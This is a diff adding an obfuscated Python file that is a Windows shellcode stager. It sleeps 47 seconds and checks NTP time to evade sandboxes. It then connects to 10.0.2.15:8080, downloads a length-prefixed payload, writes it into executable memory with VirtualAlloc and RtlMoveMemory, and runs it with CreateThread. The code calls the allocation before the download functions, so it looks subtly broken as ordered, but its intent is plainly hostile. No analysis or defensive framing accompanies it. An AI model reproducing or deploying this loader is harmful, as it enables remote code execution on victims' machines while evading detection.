@@ -1,0 +1,44 @@
+import struct, socket, binascii, ctypes as HCapvzlRzuepuo, random, time
+import multiprocessing
+eIpMUixsnzT = multiprocessing.cpu_count()
+if eIpMUixsnzT >= 1:
+	from time import sleep
+	from socket import AF_INET, SOCK_DGRAM
+	import sys
+	import datetime
+	import time
+	import socket
+	import struct
+	client = socket.socket(AF_INET, SOCK_DGRAM)
+	client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))
+	msg, address = client.recvfrom( 1024 )
+	bEMVGvxZra = datetime.datetime.fromtimestamp(struct.unpack("!12I",msg)[10] - 2208988800)
+	sleep(47)
+	client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))
+	msg, address = client.recvfrom( 1024 )
+	if ((datetime.datetime.fromtimestamp((struct.unpack("!12I",msg)[10] - 2208988800)) - bEMVGvxZra).seconds >= 47):
+		jbdEcgSnWAxSBv, hRvEiU = None, None
+		def hCmwthkRBYBb():
+			try:
+				global hRvEiU
+				hRvEiU = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				hRvEiU.connect(('10.0.2.15', 8080))
+				LhiUHcBc = struct.pack('<i', hRvEiU.fileno())
+				l = struct.unpack('<i', hRvEiU.recv(4))[0]
+				AGhOqHiXWxwJWi = b"     "
+				while len(AGhOqHiXWxwJWi) < l: AGhOqHiXWxwJWi += hRvEiU.recv(l)
+				CHmPYIIZxCa = HCapvzlRzuepuo.create_string_buffer(AGhOqHiXWxwJWi, len(AGhOqHiXWxwJWi))
+				CHmPYIIZxCa[0] = binascii.unhexlify('BF')
+				for i in range(4): CHmPYIIZxCa[i+1] = LhiUHcBc[i]
+				return CHmPYIIZxCa
+			except: return None
+		def fYUceWxYy(IjMCCZ):
+			if IjMCCZ != None:
+				UMBMeDfTNJHtyC = bytearray(IjMCCZ)
+		WAqlzcRdD = HCapvzlRzuepuo.windll.kernel32.VirtualAlloc(HCapvzlRzuepuo.c_int(0),HCapvzlRzuepuo.c_int(len(UMBMeDfTNJHtyC)),HCapvzlRzuepuo.c_int(0x3000),HCapvzlRzuepuo.c_int(0x40))
+		JXGEJVYxuyq = (HCapvzlRzuepuo.c_char * len(UMBMeDfTNJHtyC)).from_buffer(UMBMeDfTNJHtyC)
+		HCapvzlRzuepuo.windll.kernel32.RtlMoveMemory(HCapvzlRzuepuo.c_int(WAqlzcRdD), JXGEJVYxuyq, HCapvzlRzuepuo.c_int(len(UMBMeDfTNJHtyC)))
+		ht = HCapvzlRzuepuo.windll.kernel32.CreateThread(HCapvzlRzuepuo.c_int(0),HCapvzlRzuepuo.c_int(0),HCapvzlRzuepuo.c_int(WAqlzcRdD),HCapvzlRzuepuo.c_int(0),HCapvzlRzuepuo.c_int(0),HCapvzlRzuepuo.pointer(HCapvzlRzuepuo.c_int(0)))
+		HCapvzlRzuepuo.windll.kernel32.WaitForSingleObject(HCapvzlRzuepuo.c_int(ht),HCapvzlRzuepuo.c_int(-1))
+		jbdEcgSnWAxSBv = hCmwthkRBYBb()
+		fYUceWxYy(jbdEcgSnWAxSBv)
